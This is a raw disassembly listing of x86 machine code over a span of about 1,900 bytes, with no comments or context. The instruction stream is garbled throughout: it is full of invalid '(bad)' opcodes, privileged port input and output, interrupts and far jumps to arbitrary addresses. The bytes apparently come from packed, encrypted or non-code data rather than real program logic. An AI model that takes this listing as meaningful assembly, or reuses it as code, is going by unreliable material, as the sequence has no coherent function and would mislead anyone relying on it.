  42c18c:	cmp    BYTE PTR [edi],bh
  42c18e:	(bad)  
  42c18f:	fadd   st,st(0)
  42c191:	call   0xb6db:0x45ad8d7f
  42c198:	sub    al,0x96
  42c19a:	push   ebx
  42c19b:	or     BYTE PTR [eax-0x45b5d0d6],al
  42c1a1:	call   0xf4c4:0xec616808
  42c1a8:	push   ecx
  42c1a9:	arpl   WORD PTR [ebx-0x65],bp
  42c1ac:	adc    BYTE PTR [ecx+0x67],0x3c
  42c1b0:	or     BYTE PTR [ebx+ebx*4+0x10746e57],bh
  42c1b7:	jno    0x42c202
  42c1b9:	pop    ecx
  42c1ba:	mov    BYTE PTR [edx*8-0x2faed16b],bl
  42c1c1:	int    0xd4
  42c1c3:	cmp    edx,esp
  42c1c5:	sbb    eax,0xa9703abf
  42c1ca:	mov    edx,ebx
  42c1cc:	mov    ds:0x3d4c6bbb,eax
  42c1d1:	in     al,dx
  42c1d2:	lds    esi,FWORD PTR [esi]
  42c1d4:	mov    bl,bl
  42c1d6:	(bad)  
  42c1d7:	add    eax,0xb82c0b55
  42c1dc:	fnstsw WORD PTR [eax+0x410d42f0]
  42c1e2:	in     eax,dx
  42c1e3:	sti    
  42c1e4:	data16 jp 0x42c1b2
  42c1e7:	mov    WORD PTR [ebp+edx*1-0x60],es
  42c1eb:	mov    ebp,eax
  42c1ed:	jp     0x42c1b0
  42c1ef:	adc    ah,BYTE PTR [edx+0x2b]
  42c1f2:	ins    DWORD PTR es:[edi],dx
  42c1f3:	imul   ebx,eax,0x4c
  42c1f6:	dec    ebx
  42c1f7:	xchg   edx,eax
  42c1f8:	repnz (bad) 
  42c1fa:	int    0xe9
  42c1fc:	(bad)  
  42c1fd:	into   
  42c1fe:	adc    edx,esp
  42c200:	push   es
  42c201:	mov    ds:0xebd397f,al
  42c206:	xchg   ebp,eax
  42c207:	dec    ebp
  42c208:	inc    eax
  42c209:	sub    al,0x55
  42c20b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c20c:	xchg   BYTE PTR es:0x83b150a5,dh
  42c213:	mov    al,ds:0xae14e087
  42c218:	inc    ecx
  42c219:	dec    ebx
  42c21a:	rcl    dh,0x18
  42c21d:	jle    0x42c233
  42c21f:	dec    eax
  42c220:	mov    ebp,DWORD PTR [esi-0x26]
  42c223:	cs mov eax,0x954f5975
  42c229:	ds test eax,0xec06adee
  42c22f:	pop    ss
  42c230:	inc    ebp
  42c231:	xchg   edi,eax
  42c232:	push   ss
  42c233:	and    ah,BYTE PTR ds:0xdafadb62
  42c239:	mov    ah,0x6d
  42c23b:	ins    DWORD PTR es:[edi],dx
  42c23c:	ins    DWORD PTR es:[edi],dx
  42c23d:	in     al,0x70
  42c23f:	inc    ecx
  42c240:	jge    0x42c1cd
  42c242:	test   DWORD PTR [esi+ebp*2],esi
  42c245:	cmp    al,dh
  42c247:	inc    edx
  42c248:	mov    eax,ds:0xa64dd0a
  42c24d:	test   eax,0xa8edb045
  42c252:	loopne 0x42c22b
  42c254:	push   es
  42c255:	aaa    
  42c256:	in     eax,dx
  42c257:	fs mov esi,ss
  42c25a:	push   0xffffffbb
  42c25c:	jne    0x42c26f
  42c25e:	rcl    DWORD PTR [edi-0x4f4b6c41],cl
  42c264:	into   
  42c265:	or     eax,0xa62a6d50
  42c26a:	sbb    eax,0xc44d08f6
  42c26f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c270:	mov    ds:0xf8e83d5b,al
  42c275:	nop
  42c276:	jle    0x42c275
  42c278:	rol    DWORD PTR [esi],1
  42c27a:	push   ecx
  42c27b:	push   ebx
  42c27c:	xor    ebx,DWORD PTR [esi+0x3b68a1f2]
  42c282:	push   0xd9844503
  42c287:	imul   DWORD PTR [edx-0x61]
  42c28a:	rcl    eax,1
  42c28c:	cs sub al,0x38
  42c28f:	inc    edi
  42c290:	and    eax,0xeb077c47
  42c295:	jge    0x42c302
  42c297:	mov    ebx,0x88d0ba20
  42c29c:	aam    0x6a
  42c29e:	inc    esi
  42c29f:	xor    ebx,DWORD PTR ds:0xf06e5b38
  42c2a5:	jo     0x42c2b6
  42c2a7:	mov    bh,0x3a
  42c2a9:	stos   DWORD PTR es:[edi],eax
  42c2aa:	outs   dx,BYTE PTR ds:[esi]
  42c2ab:	jmp    0xb298dc06
  42c2b0:	ins    DWORD PTR es:[edi],dx
  42c2b1:	mov    BYTE PTR [eax-0x1a],ch
  42c2b4:	test   BYTE PTR [ebx+0x59],ch
  42c2b7:	mov    WORD PTR [ebx+0x9],es
  42c2ba:	pusha  
  42c2bb:	push   edi
  42c2bc:	rcr    BYTE PTR [edx-0x5b],0x8e
  42c2c0:	xchg   edx,eax
  42c2c1:	mov    esp,0xa28d6fca
  42c2c6:	jg     0x42c2d9
  42c2c8:	push   cs
  42c2c9:	mov    al,ds:0x3c1b00f4
  42c2ce:	inc    edi
  42c2cf:	add    al,0x97
  42c2d1:	push   ss
  42c2d2:	out    dx,al
  42c2d3:	push   0xffc0271a
  42c2d8:	adc    al,0xb5
  42c2da:	test   eax,0xd20cec68
  42c2df:	aam    0x5e
  42c2e1:	add    al,0x3b
  42c2e3:	add    bl,dl
  42c2e5:	mov    esi,DWORD PTR [edx]
  42c2e7:	jge    0x42c2df
  42c2e9:	push   es
  42c2ea:	in     al,0x5a
  42c2ec:	mov    ebx,0xf5bd4db5
  42c2f1:	imul   ecx,DWORD PTR [ebx],0x65
  42c2f4:	in     eax,dx
  42c2f5:	dec    BYTE PTR [esi]
  42c2f7:	sub    al,0xb6
  42c2f9:	xchg   esp,eax
  42c2fa:	imul   eax,DWORD PTR [ebx],0xff47c21d
  42c300:	aad    0x9
  42c302:	mov    eax,0x6adb6ed0
  42c307:	outs   dx,BYTE PTR ds:[esi]
  42c308:	inc    edx
  42c309:	ja     0x42c2a2
  42c30b:	pop    eax
  42c30c:	(bad)  [edx+edx*4-0x7125e807]
  42c313:	or     BYTE PTR [eax+0x4e],bl
  42c316:	push   ebp
  42c317:	inc    edi
  42c318:	sbb    al,0x91
  42c31a:	push   eax
  42c31b:	lea    esi,[esi-0x104be523]
  42c321:	inc    BYTE PTR [ebp+0x62]
  42c324:	mov    eax,0x4ba521e6
  42c329:	dec    ebp
  42c32a:	aam    0xf8
  42c32c:	pop    ds
  42c32d:	cmp    ah,BYTE PTR [ecx+0xe80014a]
  42c333:	(bad)  
  42c334:	sub    BYTE PTR [edx+0x15],cl
  42c337:	cmp    bl,BYTE PTR [ecx-0x50]
  42c33a:	scas   al,BYTE PTR es:[edi]
  42c33b:	and    dh,BYTE PTR [esi-0x28107325]
  42c341:	in     eax,0x68
  42c343:	add    DWORD PTR cs:[ecx],eax
  42c346:	fld    TBYTE PTR [ebp+0xda15ca5]
  42c34c:	jl     0x42c331
  42c34e:	xchg   ebx,eax
  42c34f:	cwde   
  42c350:	popf   
  42c351:	(bad)  
  42c352:	mov    dh,0xd0
  42c354:	adc    ebx,edx
  42c356:	sbb    ah,BYTE PTR [edi-0x2d]
  42c359:	or     BYTE PTR [ecx],bh
  42c35b:	pop    fs
  42c35d:	in     eax,dx
  42c35e:	or     al,ch
  42c360:	mov    bl,0x8d
  42c362:	aas    
  42c363:	fwait
  42c364:	rcr    DWORD PTR [edx],cl
  42c366:	fist   DWORD PTR [bx+si]
  42c369:	les    esi,FWORD PTR [esi-0x49]
  42c36c:	call   0x4841cf45
  42c371:	fs mov dh,0x9b
  42c374:	mov    al,ds:0x23aa5b4b
  42c379:	sub    DWORD PTR [ebx+0x39],edx
  42c37c:	stc    
  42c37d:	int    0xa6
  42c37f:	outs   dx,BYTE PTR ds:[esi]
  42c380:	pop    ebx
  42c381:	inc    ebx
  42c382:	adc    al,0x20
  42c384:	shl    BYTE PTR [eax+0x25079e15],1
  42c38a:	mov    ds:0x2a02badd,eax
  42c38f:	pusha  
  42c390:	(bad)  
  42c391:	hlt    
  42c392:	add    DWORD PTR [ebx+0x7141da45],eax
  42c398:	imul   ebx,DWORD PTR [ebp-0x3b],0x46dee9d9
  42c39f:	jmp    0xb2d6474
  42c3a4:	xchg   esp,eax
  42c3a5:	in     al,dx
  42c3a6:	sbb    DWORD PTR [edx-0x65],ebp
  42c3a9:	add    bh,BYTE PTR [eax-0x1b0b4aa2]
  42c3af:	xchg   esi,eax
  42c3b0:	shl    DWORD PTR [ebp-0x5f],0x8a
  42c3b4:	pop    ebx
  42c3b5:	or     DWORD PTR [edi-0x93969b3],ebx
  42c3bb:	mov    ch,0x6c
  42c3bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c3be:	test   al,0xe9
  42c3c0:	or     DWORD PTR [ebx],0x16
  42c3c3:	mov    ebx,0x74405db5
  42c3c8:	xchg   edx,eax
  42c3c9:	lahf   
  42c3ca:	sbb    al,0x59
  42c3cc:	mov    ebp,DWORD PTR [ecx]
  42c3ce:	(bad)  [esi+0x3f1f6e51]
  42c3d4:	repz aas 
  42c3d6:	ins    DWORD PTR es:[edi],dx
  42c3d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c3d8:	lahf   
  42c3d9:	add    eax,0xb0ba0a18
  42c3de:	ins    DWORD PTR es:[edi],dx
  42c3df:	imul   ecx,DWORD PTR [ebx-0x727df1e3],0xffffffee
  42c3e6:	fmul   st(4),st
  42c3e8:	or     ebp,esp
  42c3ea:	mov    dl,0x6b
  42c3ec:	push   ebp
  42c3ed:	or     al,0xd0
  42c3ef:	add    BYTE PTR [edx+0x29],al
  42c3f2:	cmp    eax,0x145db524
  42c3f7:	sub    eax,0x629be91
  42c3fc:	pop    edi
  42c3fd:	dec    ebp
  42c3fe:	inc    ecx
  42c3ff:	pop    ecx
  42c400:	mov    edx,0x77af26b4
  42c405:	sbb    al,0x3e
  42c407:	dec    edx
  42c408:	add    dl,dh
  42c40a:	(bad)  
  42c40b:	(bad)  
  42c40c:	mov    dh,0xd4
  42c40e:	sbb    DWORD PTR [esi-0x2f62a1fa],0x5b
  42c415:	dec    esp
  42c416:	jmp    0x42c440
  42c418:	loop   0x42c3dc
  42c41a:	mov    ecx,0x2acb98fa
  42c41f:	jne    0x42c401
  42c421:	ins    BYTE PTR es:[edi],dx
  42c422:	mov    ah,0x4d
  42c424:	jno    0x42c441
  42c426:	fldenv [eax-0x6bb81a2]
  42c42c:	retf   0x2e97
  42c42f:	xchg   ebp,eax
  42c430:	cs std 
  42c432:	clc    
  42c433:	mov    ds:0x3fc538b3,eax
  42c438:	dec    ebp
  42c439:	aas    
  42c43a:	add    BYTE PTR [ebp+0x54],cl
  42c43d:	pop    ss
  42c43e:	retf   0xbb25
  42c441:	fisttp WORD PTR [ecx+esi*8-0x19]
  42c445:	adc    ebx,esp
  42c447:	push   0x4
  42c449:	or     ebp,DWORD PTR [ebx]
  42c44b:	adc    ch,BYTE PTR [edi+0x1b4a956a]
  42c451:	ins    BYTE PTR es:[edi],dx
  42c452:	je     0x42c459
  42c454:	xchg   ebx,eax
  42c455:	fadd   QWORD PTR [edx-0x64]
  42c458:	fisubr DWORD PTR [esi-0x6c]
  42c45b:	and    eax,0x2
  42c45e:	or     eax,eax
  42c460:	lea    eax,[eax-0x65]
  42c463:	and    BYTE PTR [esi-0x53bb43e5],dh
  42c469:	pop    esp
  42c46a:	adc    al,0xc4
  42c46c:	and    ah,cl
  42c46e:	mov    bh,0x5
  42c470:	jo     0x42c487
  42c472:	lahf   
  42c473:	mov    al,ds:0xbd5bf5fc
  42c478:	pusha  
  42c479:	inc    edi
  42c47a:	inc    eax
  42c47b:	sbb    esp,esp
  42c47d:	jne    0x42c43f
  42c47f:	fwait
  42c480:	loope  0x42c4e7
  42c482:	imul   ebp,DWORD PTR [eax+ebp*1-0x1],0x4c
  42c487:	dec    eax
  42c488:	leave  
  42c489:	jecxz  0x42c4e5
  42c48b:	test   eax,0x30b70b2d
  42c490:	das    
  42c491:	pusha  
  42c492:	inc    eax
  42c493:	adc    BYTE PTR [edx],bl
  42c495:	dec    esp
  42c496:	mov    edi,0x55d4b62c
  42c49b:	jo     0x42c515
  42c49d:	mov    ah,0x61
  42c49f:	add    bl,BYTE PTR [edi-0x44]
  42c4a2:	sub    al,0x2e
  42c4a4:	sub    ch,0xd2
  42c4a7:	jo     0x42c4de
  42c4a9:	dec    edx
  42c4aa:	adc    cl,BYTE PTR [edi+0x6dadfd35]
  42c4b0:	fild   DWORD PTR [ebp-0x22b1e6e8]
  42c4b6:	aam    0x84
  42c4b8:	(bad)  
  42c4b9:	mov    eax,ds:0x5c11a47a
  42c4be:	push   0x2038a6db
  42c4c3:	add    DWORD PTR [esp+ebx*1-0x7],eax
  42c4c7:	stos   BYTE PTR es:[edi],al
  42c4c8:	mov    cl,0xab
  42c4ca:	mov    ds:0x4f7ae34d,al
  42c4cf:	call   0x23efdf21
  42c4d4:	jbe    0x42c4e7
  42c4d6:	imul   ebp,DWORD PTR [eax-0x58e340c4],0x4b
  42c4dd:	lea    ebx,[edi-0x49]
  42c4e0:	clc    
  42c4e1:	xchg   edx,eax
  42c4e2:	test   DWORD PTR [eax-0x30],esi
  42c4e5:	loop   0x42c551
  42c4e7:	scas   al,BYTE PTR es:[edi]
  42c4e8:	add    eax,0x6dadd542
  42c4ed:	adc    bh,ah
  42c4ef:	fs sub al,0xe9
  42c4f2:	cmc    
  42c4f3:	jp     0x42c55f
  42c4f5:	inc    eax
  42c4f6:	pop    ebx
  42c4f7:	pop    es
  42c4f8:	call   0x61aca5d6
  42c4fd:	ins    DWORD PTR es:[edi],dx
  42c4fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c4ff:	(bad)  
  42c500:	fstp   TBYTE PTR [eax-0x62bc737f]
  42c506:	sub    edx,eax
  42c508:	sub    esp,DWORD PTR [eax-0x25]
  42c50b:	cs iret 
  42c50d:	(bad)  
  42c50f:	push   esi
  42c510:	adc    DWORD PTR ds:0x6da24b2a,eax
  42c516:	and    DWORD PTR [eax-0x4fc959c4],0xffffffde
  42c51d:	cmp    eax,DWORD PTR [eax-0x50]
  42c520:	test   eax,0x9ed66a65
  42c525:	out    0x2b,al
  42c527:	fadd   DWORD PTR [eax+0x74]
  42c52a:	mov    dh,BYTE PTR [ebx+ebx*1-0x5f0a2975]
  42c531:	dec    ebp
  42c532:	add    DWORD PTR [eax+0x60d956e4],esi
  42c538:	ja     0x42c4fb
  42c53a:	ret    0x26ad
  42c53d:	stos   DWORD PTR es:[edi],eax
  42c53e:	imul   edi,DWORD PTR [ecx-0x14],0x27
  42c542:	xchg   esp,eax
  42c543:	es ret 0xdb46
  42c547:	inc    eax
  42c548:	not    BYTE PTR [edi-0x2260c1f6]
  42c54e:	mov    dl,0xba
  42c550:	js     0x42c5bc
  42c552:	loope  0x42c4dc
  42c554:	push   esp
  42c555:	push   ss
  42c556:	(bad)  
  42c557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c558:	mov    esi,0xe2a3b881
  42c55d:	(bad)  
  42c55e:	(bad)  
  42c55f:	mov    edi,0x8fb435ec
  42c564:	push   0xe8221a86
  42c569:	test   al,0xa6
  42c56b:	fmul   st(4),st
  42c56d:	(bad)  
  42c56e:	xor    al,0x82
  42c570:	pop    ebx
  42c571:	add    ebx,esp
  42c573:	and    ecx,DWORD PTR [eax]
  42c575:	jnp    0x42c56e
  42c577:	sub    al,0x47
  42c579:	call   0xf2ba:0xddad8533
  42c580:	sub    ebp,DWORD PTR [edi]
  42c582:	mov    esp,0xa4c5b99e
  42c587:	mov    BYTE PTR [edx],ch
  42c589:	mov    bh,0x85
  42c58b:	test   DWORD PTR [ebp+0x2b501dc],esi
  42c591:	pop    edi
  42c592:	push   eax
  42c593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c594:	mov    ah,0x2b
  42c596:	bound  eax,QWORD PTR [ebx-0x160a8971]
  42c59c:	cwde   
  42c59d:	pop    ecx
  42c59e:	fdiv   DWORD PTR [esi+0x10]
  42c5a1:	enter  0xdc12,0x8c
  42c5a5:	xor    ebx,DWORD PTR [eax+0x7c]
  42c5a8:	inc    edi
  42c5a9:	push   esp
  42c5aa:	or     eax,DWORD PTR [edi+edx*4-0x2f]
  42c5ae:	dec    ebx
  42c5af:	outs   dx,BYTE PTR ds:[esi]
  42c5b0:	sub    eax,0x32015b6c
  42c5b5:	pushf  
  42c5b6:	push   cs
  42c5b7:	xor    eax,0x49165622
  42c5bc:	data16 fistp DWORD PTR [edx+0x68]
  42c5c0:	mov    al,BYTE PTR [edx]
  42c5c2:	push   0x9304223d
  42c5c7:	push   cs
  42c5c8:	inc    edx
  42c5c9:	add    esi,DWORD PTR [ecx+0x63]
  42c5cc:	ficom  DWORD PTR [esi+0x61b8e267]
  42c5d2:	aaa    
  42c5d3:	aam    0x88
  42c5d5:	add    al,cl
  42c5d7:	aam    0x89
  42c5d9:	inc    ecx
  42c5da:	sbb    DWORD PTR [eax-0x7b914b48],ecx
  42c5e0:	clc    
  42c5e1:	sub    al,BYTE PTR [ecx]
  42c5e3:	je     0x42c5d1
  42c5e5:	or     BYTE PTR [edx-0x58],bl
  42c5e8:	push   ebp
  42c5e9:	sub    al,0x48
  42c5eb:	outs   dx,DWORD PTR ds:[esi]
  42c5ec:	test   al,0x6e
  42c5ee:	add    DWORD PTR [ebx],ebx
  42c5f0:	or     eax,0xc6fc3b15
  42c5f5:	dec    ebx
  42c5f6:	jno    0x42c663
  42c5f8:	mov    bh,0x5a
  42c5fa:	dec    ebx
  42c5fb:	cs cmp al,ch
  42c5fe:	or     BYTE PTR [ebp+0x12],cl
  42c601:	dec    ecx
  42c602:	sub    al,0x6c
  42c604:	je     0x42c606
  42c606:	nop
  42c607:	clc    
  42c608:	arpl   ax,si
  42c60a:	and    ah,BYTE PTR [esi+ebp*1]
  42c60d:	mov    bl,bl
  42c60f:	mov    dh,0x3b
  42c611:	es scas al,BYTE PTR es:[edi]
  42c613:	xor    eax,0xd0612a40
  42c618:	and    BYTE PTR [ecx-0x305f81b6],0xf0
  42c61f:	fnstcw WORD PTR [eax+0x29dfb1b0]
  42c625:	xchg   esi,eax
  42c626:	adc    eax,0x12dadb67
  42c62b:	jnp    0x42c644
  42c62d:	fcomp  QWORD PTR [edx+0x50]
  42c630:	pop    esp
  42c631:	jp     0x42c6a6
  42c633:	sub    DWORD PTR [ebx-0x30],ebx
  42c636:	mov    dh,0xb
  42c638:	ins    DWORD PTR es:[edi],dx
  42c639:	jge    0x42c5d5
  42c63b:	inc    edi
  42c63c:	xchg   edi,eax
  42c63d:	jnp    0x42c64f
  42c63f:	mov    edi,0x83b51158
  42c644:	loop   0x42c5fc
  42c646:	scas   eax,DWORD PTR es:[edi]
  42c647:	mov    eax,0x963dfa2c
  42c64c:	fsubr  QWORD PTR [eax]
  42c64e:	fist   DWORD PTR ds:0x5dbba374
  42c654:	jns    0x42c692
  42c656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c657:	pusha  
  42c658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c659:	cmp    ecx,DWORD PTR [ebp+0x145b4b0b]
  42c65f:	retf   
  42c660:	adc    al,0x9b
  42c662:	sub    ch,bl
  42c664:	inc    esp
  42c665:	adc    dh,BYTE PTR [eax-0x6fe4eb93]
  42c66b:	dec    edx
  42c66c:	cmc    
  42c66d:	sbb    DWORD PTR [ecx+ebp*1+0x5360f8dc],edi
  42c674:	add    edi,DWORD PTR [eax]
  42c676:	stos   DWORD PTR es:[edi],eax
  42c677:	mov    edx,esp
  42c679:	rcl    BYTE PTR [eax],cl
  42c67b:	push   edi
  42c67c:	shl    DWORD PTR [esi+0xafd455d],1
  42c682:	popf   
  42c683:	or     dl,dh
  42c685:	retf   
  42c686:	mov    dh,0x74
  42c688:	mov    eax,ds:0xaa07ce15
  42c68d:	sub    edx,DWORD PTR [ecx*1+0x11335b9b]
  42c694:	fcmovnb st,st(0)
  42c696:	inc    ecx
  42c697:	xlat   BYTE PTR ds:[ebx]
  42c698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c699:	(bad)  
  42c69a:	into   
  42c69b:	dec    esp
  42c69c:	or     ebp,DWORD PTR [ebp+0x53]
  42c69f:	add    ebp,esp
  42c6a1:	add    eax,0x91dc4d67
  42c6a6:	mov    ds:0x6c1b822b,eax
  42c6ab:	scas   eax,DWORD PTR es:[edi]
  42c6ac:	jae    0x42c727
  42c6ae:	push   ebx
  42c6af:	inc    edx
  42c6b0:	xor    al,0x0
  42c6b2:	je     0x42c715
  42c6b4:	inc    esp
  42c6b5:	dec    esp
  42c6b6:	jle    0x42c6d0
  42c6b8:	jmp    0xb0e63cda
  42c6bd:	add    al,0x3d
  42c6bf:	sub    eax,0x1b7296bb
  42c6c4:	and    BYTE PTR [edx+0x1c8825b6],cl
  42c6ca:	pop    ss
  42c6cb:	or     ebp,DWORD PTR [esi]
  42c6cd:	sbb    dl,ch
  42c6cf:	inc    esp
  42c6d0:	sbb    ebp,DWORD PTR [ebx+0x6b]
  42c6d3:	push   edx
  42c6d4:	or     al,0xc9
  42c6d6:	jle    0x42c745
  42c6d8:	push   edi
  42c6d9:	adc    DWORD PTR [edi+0x7f8246ca],esi
  42c6df:	(bad)  
  42c6e0:	aad    0x65
  42c6e2:	add    ebx,eax
  42c6e4:	outs   dx,BYTE PTR ds:[esi]
  42c6e5:	mov    ch,0x6c
  42c6e7:	rcl    ebx,1
  42c6e9:	mov    ebp,0xda910542
  42c6ee:	fidiv  DWORD PTR [esi]
  42c6f0:	shr    BYTE PTR [ebp+0x39d050c8],1
  42c6f6:	push   0x27c5a494
  42c6fb:	jo     0x42c75e
  42c6fd:	imul   ebp,DWORD PTR [eax-0x59e22248],0x10
  42c704:	xchg   edi,eax
  42c705:	dec    ecx
  42c706:	add    DWORD PTR [edx+0x14af111d],ecx
  42c70c:	ret    
  42c70d:	and    DWORD PTR [esi+0x4a176b6],edx
  42c713:	mov    BYTE PTR [esp+ebx*8],dh
  42c716:	in     al,dx
  42c717:	xchg   BYTE PTR [eax+0x11744e74],cl
  42c71d:	ins    BYTE PTR es:[edi],dx
  42c71e:	aaa    
  42c71f:	xchg   DWORD PTR [edi-0x4fa5b39],ebx
  42c725:	sub    DWORD PTR [eax-0x49],edx
  42c728:	or     al,0x2c
  42c72a:	xchg   ecx,eax
  42c72b:	sar    DWORD PTR [ecx],0x88
  42c72e:	xchg   bx,ax
  42c730:	retf   
  42c731:	mov    BYTE PTR [edx+0x53],0xde
  42c735:	pop    ecx
  42c736:	cli    
  42c737:	ja     0x42c781
  42c739:	dec    ebx
  42c73a:	cmp    DWORD PTR [ebp+0x5c6d2e2b],ebp
  42c740:	repz or BYTE PTR [eax],ah
  42c743:	or     bl,BYTE PTR [edx+ebx*4+0x5130a38f]
  42c74a:	mov    bh,0xa4
  42c74c:	and    ebp,DWORD PTR [esi+0x54]
  42c74f:	ror    DWORD PTR [eax],0xd0
  42c752:	inc    eax
  42c753:	je     0x42c7b8
  42c755:	adc    DWORD PTR [ecx],ecx
  42c757:	adc    eax,0x717ed1e
  42c75c:	push   ecx
  42c75d:	mov    bh,0x12
  42c75f:	fs sahf 
  42c761:	pslld  mm4,mm4
  42c764:	push   esi
  42c765:	add    al,0xb
  42c767:	ins    DWORD PTR es:[edi],dx
  42c768:	xchg   BYTE PTR [edx-0x1a],ch
  42c76b:	les    eax,FWORD PTR [ecx-0x7a7a5d90]
  42c771:	lea    ecx,[ebp-0x53e3b0fe]
  42c777:	in     eax,dx
  42c778:	aad    0x2e
  42c77a:	or     BYTE PTR [esi],dl
  42c77c:	loop   0x42c734
  42c77e:	gs addr16 cmp esp,eax
  42c782:	mov    BYTE PTR es:0x8b3eca2e,bl
  42c789:	xchg   dh,dl
  42c78b:	sub    ch,bh
  42c78d:	fidiv  DWORD PTR [esi-0x26]
  42c790:	jnp    0x42c71d
  42c792:	mov    ecx,0xcdcc13ca
  42c797:	sub    al,0x4d
  42c799:	push   ecx
  42c79a:	pop    ebp
  42c79b:	fsubr  DWORD PTR [esi-0x71e18344]
  42c7a1:	push   esi
  42c7a2:	les    eax,FWORD PTR [ecx]
  42c7a4:	jne    0x42c789
  42c7a6:	mov    esp,DWORD PTR [ebp+0x62d27bea]
  42c7ac:	int3   
  42c7ad:	ins    BYTE PTR es:[edi],dx
  42c7ae:	add    bh,BYTE PTR [edx-0x523f098b]
  42c7b4:	ins    BYTE PTR es:[edi],dx
  42c7b5:	pop    edx
  42c7b6:	int3   
  42c7b7:	jmp    0x8b3c:0x2e21b0c7
  42c7be:	pushf  
  42c7bf:	mov    ebx,0xc818ce8c
  42c7c4:	jns    0x42c74b
  42c7c6:	scas   al,BYTE PTR es:[edi]
  42c7c7:	fiadd  DWORD PTR [ecx+0x4f]
  42c7ca:	sub    esi,DWORD PTR [edx+0x4]
  42c7cd:	push   eax
  42c7ce:	popf   
  42c7cf:	push   es
  42c7d0:	and    dh,BYTE PTR [esi-0x30]
  42c7d3:	aaa    
  42c7d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c7d5:	aaa    
  42c7d6:	xchg   ebp,eax
  42c7d7:	xor    esp,DWORD PTR [ebx]
  42c7d9:	ins    BYTE PTR es:[edi],dx
  42c7da:	xchg   esp,eax
  42c7db:	sub    bl,dl
  42c7dd:	call   0xa8d12aab
  42c7e2:	xchg   esp,eax
  42c7e3:	aam    0x55
  42c7e5:	rcl    DWORD PTR [edx-0x42],0xfb
  42c7e9:	in     al,dx
  42c7ea:	rol    BYTE PTR [edi-0x7b],0x60
  42c7ee:	rcl    esp,0x9a
  42c7f1:	outs   dx,DWORD PTR ds:[esi]
  42c7f2:	xor    dh,BYTE PTR [edi]
  42c7f4:	fcmovnb st,st(2)
  42c7f6:	push   ebx
  42c7f7:	pop    ebx
  42c7f8:	mov    dl,0xbf
  42c7fa:	je     0x42c811
  42c7fc:	pop    esp
  42c7fd:	mov    eax,0x80ea715d
  42c802:	movaps xmm5,XMMWORD PTR [esi+0x20]
  42c806:	ret    
  42c807:	(bad)  
  42c808:	mov    al,0x60
  42c80a:	adc    edx,DWORD PTR [ecx+0x1b]
  42c80d:	fwait
  42c80e:	ins    DWORD PTR es:[edi],dx
  42c80f:	mov    ds:0xecc4d8ad,eax
  42c814:	pop    ebp
  42c815:	ins    DWORD PTR es:[edi],dx
  42c816:	imul   edx,DWORD PTR [ecx+0x5e],0x2
  42c81a:	fucom  st(1)
  42c81c:	pop    ecx
  42c81d:	add    BYTE PTR [ecx],bl
  42c81f:	stos   BYTE PTR es:[edi],al
  42c820:	mov    dh,0x3
  42c822:	mov    dh,BYTE PTR [edx]
  42c824:	pop    esp
  42c825:	test   DWORD PTR [edi+0x44],0x2b502c28
  42c82c:	popa   
  42c82d:	ja     0x42c801
  42c82f:	sbb    al,0xda
  42c831:	scas   eax,DWORD PTR es:[edi]
  42c832:	mov    dh,0xa5
  42c834:	fisttp WORD PTR [eax-0x1b701950]
  42c83a:	cmp    cl,al
  42c83c:	ss inc edi
  42c83e:	ins    DWORD PTR es:[edi],dx
  42c83f:	or     ebx,DWORD PTR [ecx]
  42c841:	lahf   
  42c842:	mov    ecx,0x2e3426fa
  42c847:	pop    ebx
  42c848:	popa   
  42c849:	mov    DWORD PTR [edi+0x61],ebp
  42c84c:	and    eax,0xaadf1ab0
  42c851:	push   0xcbd4cdb7
  42c856:	mov    bl,0x92
  42c858:	mov    ah,0xe
  42c85a:	rol    dh,0x2
  42c85d:	imul   esp,DWORD PTR [ebx-0x4156a5a3],0xceaf20bc
  42c867:	mov    ah,0x9b
  42c869:	mov    edi,0x70553512
  42c86e:	push   edx
  42c86f:	dec    edx
  42c870:	int3   
  42c871:	lods   al,BYTE PTR ds:[esi]
  42c872:	in     al,0x13
  42c874:	lock push eax
  42c876:	aam    0xa
  42c878:	mov    ah,0x84
  42c87a:	(bad)  
  42c87b:	mov    dh,0x6a
  42c87d:	mov    ds:0x1ce0cb0a,eax
  42c882:	xchg   edi,eax
  42c883:	add    eax,DWORD PTR [eax+0x354340b]
  42c889:	out    dx,eax
  42c88a:	adc    BYTE PTR [ebp-0x45],bh
  42c88d:	bound  esp,QWORD PTR [ecx+0x65c7f2aa]
  42c893:	lea    esp,[esi+0x42]
  42c896:	loopne 0x42c8da
  42c898:	stc    
  42c899:	adc    bh,BYTE PTR [edi-0x73]
  42c89c:	add    BYTE PTR ds:0x16ce3768,bh
  42c8a2:	mov    cl,0xd0
  42c8a4:	xchg   esp,eax
  42c8a5:	add    DWORD PTR [ecx+esi*4],eax
  42c8a8:	pop    ss
  42c8a9:	in     eax,0x62
  42c8ab:	pop    ebx
  42c8ac:	push   0xe936b83f
  42c8b1:	(bad)  
  42c8b3:	mov    al,0x2a
  42c8b5:	mov    edi,0xaf473ed0
  42c8ba:	pop    ebp
  42c8bb:	add    al,0x70
  42c8bd:	xchg   edi,eax
  42c8be:	int    0x4a
  42c8c0:	mov    edi,0xd513e516
  42c8c5:	ins    DWORD PTR es:[edi],dx
  42c8c6:	mov    ds:0x2f063d16,eax
  42c8cb:	push   ss
  42c8cc:	adc    DWORD PTR [ecx],edi
  42c8ce:	inc    eax
  42c8cf:	mov    bh,0xa6
  42c8d1:	push   0xdc68aecd
  42c8d6:	push   esi
  42c8d7:	cdq    
  42c8d8:	mov    ch,BYTE PTR [ebp-0x16f24c00]
  42c8de:	enter  0x7a50,0xc9
  42c8e2:	pop    esp
  42c8e3:	mov    al,ds:0x5fc451da
  42c8e8:	inc    edx
  42c8e9:	data16 jbe 0x42c896
  42c8ec:	dec    ebp
  42c8ed:	adc    esp,ebx
  42c8ef:	sbb    cl,BYTE PTR [edx+eiz*2+0x5f5c1f8]
  42c8f6:	dec    eax
